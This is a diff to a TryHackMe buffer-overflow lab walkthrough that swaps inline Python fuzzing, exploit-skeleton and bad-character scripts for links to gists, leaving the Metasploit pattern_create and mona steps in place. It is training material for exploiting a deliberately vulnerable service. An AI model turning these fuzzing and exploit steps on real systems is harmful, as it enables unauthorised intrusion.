@@ -24,66 +24,14 @@ https://tryhackme.com/room/bufferoverflowprep
 
 ### Step 2 (Fuzz)
 
-* Run fuzz.py
-```
-import socket, time, sys
+* Run [fuzz.py](https://gist.githubusercontent.com/an0th3rhuman/1db2f50be783b9c9383d0e8ff0277dc1/raw/13b5e06ba50e06c4724569caaffdfeb8987fb525/fuzzer.py)
 
-ip = "MACHINE_IP"
-port = 1337
-timeout = 5
-
-buffer = []
-counter = 100
-while len(buffer) < 30:
-    buffer.append("A" * counter)
-    counter += 100
-
-for string in buffer:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(timeout)
-        connect = s.connect((ip, port))
-        s.recv(1024)
-        print("Fuzzing with %s bytes" % len(string))
-        s.send("OVERFLOW1 " + string + "\r\n") # Add the prefix here. Look at the required space
-        s.recv(1024)
-        s.close()
-    except:
-        print("Could not connect to " + ip + ":" + str(port))
-        sys.exit(0)
-    time.sleep(1)
-```
 * When you see the `Could not connect to the Machine`, then note the largest byte sent.
 
 ### Step 3 (EIP Control):
 
-* Create exploit.py
-```
-import socket
+* Create [exploit.py](https://gist.githubusercontent.com/an0th3rhuman/250866a7d0923603a4f96a4e14c6017d/raw/b1afe0b25c24c22d7c9277e953af130800da35ae/exploit.py)
 
-ip = "MACHINE_IP"
-port = 1337
-
-prefix = "OVERFLOW1 "
-offset = 0
-overflow = "A" * offset
-retn = ""
-padding = ""
-payload = ""
-postfix = ""
-
-buffer = prefix + overflow + retn + padding + payload + postfix
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-try:
-    s.connect((ip, port))
-    print("Sending evil buffer...")
-    s.send(buffer + "\r\n")
-    print("Done!")
-except:
-    print("Could not connect.")
-```
 
 * Create pattern, by giving 400 byte extra to the byte that we found during step2.
 `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`
@@ -101,15 +49,8 @@ except:
 
 * Create bytearray bin in Mona by excluding Bad characters. /x00 by default a bad character
 `!mona bytearray -b "\x00"`
-* Create bytearray
-```
-from __future__ import print_function
+* Create [bytearray.py](https://gist.githubusercontent.com/an0th3rhuman/751236b8ed058efdc2f5ed92c1c8b7e6/raw/bd7174ca9a8f3bcbb9eee57370b8b54265f4b4a7/badchar.py)
 
-for x in range(1, 256):
-    print("\\x" + "{:02x}".format(x), end='')
-
-print()
-```
 * Set the result to the payload variable
 * Restart the binary and run exploit.py
 * Once crashed, execute the below to know further bad characters
